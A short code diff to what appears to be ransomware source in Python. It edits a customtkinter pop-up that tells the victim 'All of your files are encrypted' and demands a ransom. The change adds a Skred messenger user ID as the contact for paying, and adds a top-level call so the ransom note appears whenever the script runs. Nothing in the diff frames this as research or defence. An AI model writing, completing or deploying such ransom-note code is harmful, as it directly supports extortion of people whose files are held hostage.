@@ -107,7 +107,7 @@ def popup_message():
         close_button.pack(side=LEFT, padx=5)
 
     # create a label
-    my_label = customtkinter.CTkLabel(root, text= 'All of your files are encrypted <^.^> \n Pay us the ransom if you want your files back')
+    my_label = customtkinter.CTkLabel(root, text= 'All of your files are encrypted <^.^> \n Pay us the ransom if you want your files back \n Get yourself a Skred account and add this user 85ce8027-23f7-456d-883f-26abd40b4784')
     my_label.pack(pady = 2)
 
     # create a button
@@ -116,3 +116,5 @@ def popup_message():
 
 
     root.mainloop()
+
+popup_message()
